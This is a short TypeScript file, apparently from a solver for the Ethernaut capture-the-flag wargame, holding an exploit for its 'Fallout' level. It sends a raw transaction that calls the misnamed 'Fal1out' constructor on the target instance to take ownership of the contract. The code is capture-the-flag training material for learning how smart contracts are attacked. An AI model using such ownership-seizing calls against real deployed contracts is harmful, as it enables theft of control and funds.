import { EthereumClient } from '../ethereum/ethereum-client';
import { Attacker } from './attacker-provider';

export const FALLOUT_LEVEL_NAME = "Fallout"

export const falloutAttacker = (): Attacker => {
    return {
        attack: async (ethereum: EthereumClient, instanceAddress: string) => {
            const callData = ethereum.createCallData('Fal1out');
            const tx = await ethereum.sendRawTx({data: callData, to: instanceAddress});
            await tx.wait();
        }
    }
}